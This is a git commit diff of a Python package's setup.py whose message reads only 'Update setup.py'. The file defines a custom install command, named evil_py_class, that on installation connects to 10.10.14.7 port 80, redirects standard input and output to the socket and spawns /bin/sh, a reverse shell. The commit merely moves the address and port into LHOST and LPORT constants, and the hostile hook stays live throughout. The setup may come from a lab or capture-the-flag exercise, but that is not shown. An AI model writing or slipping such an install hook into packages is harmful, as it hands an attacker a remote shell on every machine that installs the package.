223c7382f9df0ec46cb5441e4b5b92f8cc816188
SimonGurney <simongurney@outlook.com>
2020-10-03 11:25:52 +0100

    Update setup.py

--- setup.py
+++ setup.py
@@ -2,13 +2,17 @@ import setuptools, os
 from setuptools.command.install import install
 from distutils.command.upload import upload as upload_orig
 
+
+LHOST = "10.10.14.7"
+LPORT = 80
+
 class evil_py_class(install):
   def run(self):
     import sys,socket,pty
     try:
         s=socket.socket()
         s.settimeout(5)
-        s.connect(("10.10.14.7",80))
+        s.connect((LHOST,LPORT))
         [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
         pty.spawn("/bin/sh")
     except:
